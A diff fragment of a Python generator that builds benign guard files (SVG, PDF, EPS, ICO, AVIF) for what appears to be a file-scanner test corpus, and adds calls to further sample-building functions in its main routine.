+              b"Photograph taken with a Canon EOS R5 at ISO 3200, "
+              b"f/1.4, 1/1000s. Location: 48.8566N, 2.3522E. "
+              b"Copyright 2024 Example Photographer. All rights reserved. "
+              b"This image may not be reproduced without permission. " * 3))
+
+    clean("clean-svg-animate-color.svg",
+          "SVG with a color animation (no script)",
+          svg('<rect width="10" height="10" fill="red">'
+              '<animate attributeName="fill" from="red" to="blue" dur="2s"/>'
+              '</rect>'))
+
+    clean("clean-svg-filter-blur.svg",
+          "SVG with a Gaussian blur filter",
+          svg('<defs><filter id="f"><feGaussianBlur stdDeviation="2"/></filter></defs>'
+              '<rect width="10" height="10" filter="url(#f)"/>'))
+
+    clean("clean-svg-use-local.svg",
+          "SVG use element referencing a local symbol",
+          svg('<defs><symbol id="s"><rect width="5" height="5"/></symbol></defs>'
+              '<use href="#s" x="2" y="2"/>'))
+
+    clean("clean-pdf-outline.pdf",
+          "PDF with bookmarks and page destinations",
+          pdf({5: b"<< /Type /Outlines /First 6 0 R /Last 6 0 R /Count 1 >>",
+               6: b"<< /Title (Chapter 1) /Parent 5 0 R /Dest [3 0 R /Fit] >>"},
+              catalog=b"/Outlines 5 0 R "))
+
+    clean("clean-pdf-acroform.pdf",
+          "PDF with a text field but no JavaScript",
+          pdf({5: b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (name) "
+               b"/Rect [10 10 200 30] /V (John Doe) >>"},
+              catalog=b"/AcroForm << /Fields [5 0 R] >> ",
+              page=b"/Annots [5 0 R] "))
+
+    clean("clean-pdf-link-small.pdf",
+          "PDF with a small web link that does not cover the page",
+          pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 2 1] "
+               b"/A << /S /URI /URI (https://example.com) >> >>"},
+              page=b"/Annots [5 0 R] "))
+
+    clean("clean-pdf-metadata-xmp.pdf",
+          "PDF with a standard XMP metadata stream",
+          pdf({5: stream(
+              b'<?xpacket begin="\xef\xbb\xbf"?>'
+              b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
+              b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
+              b'<rdf:Description rdf:about=""/>'
+              b'</rdf:RDF></x:xmpmeta><?xpacket end="w"?>',
+              b"/Type /Metadata /Subtype /XML ")}))
+
+    clean("clean-eps-standard.eps",
+          "Standard EPS with drawing commands only",
+          eps("newpath 0 0 moveto 10 0 lineto 10 10 lineto closepath "
+              "0.5 setgray fill"))
+
+    # Minimal hand-built ICO and AVIF: the scanner flags them as malformed
+    # because they lack real pixel data, so these are structural samples,
+    # not false-positive guards.
+    ico_hdr = b"\x00\x00\x01\x00\x01\x00"
+    ico_ent = bytes([16, 16, 0, 0, 1, 0, 32, 0]) + struct.pack("<I", 4) + struct.pack("<I", 22)
+    ico_dib = struct.pack("<IiiHHIIiiII", 40, 16, 32, 1, 32, 0, 16*16*4, 0, 0, 0, 0)
+    ico_px = b"\x00" * (16 * 16 * 4)
+    sample("clean-ico.ico", "Minimal hand-built ICO (flagged as malformed)",
+           ico_hdr + ico_ent + ico_dib + ico_px)
+    sample("clean-avif.avif", "Minimal hand-built AVIF (flagged as malformed)",
+           b"\x00\x00\x00\x1Cftypavif\x00\x00\x00\x00avifmif1miaf"
+           b"\x00\x00\x00\x18meta\x00\x00\x00\x00\x00\x00\x00\x10hdlrpict")
+
+
+
 def main():
     out = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).parent / "files"
     out.mkdir(parents=True, exist_ok=True)
@@ -620,6 +1317,12 @@ def main():
     polyglots_extra()
     bombs()
     names_and_metadata()
+    pdf_deep()
+    container_images()
+    postscript_advanced()
+    svg_advanced()
+    evasion()
+    clean_guards_extra()
     names = [name for name, _, _, _ in SAMPLES]
     assert len(names) == len(set(names)), f"duplicate: {[n for n in names if names.count(n) > 1]}"
     for name, _, data, _ in SAMPLES:
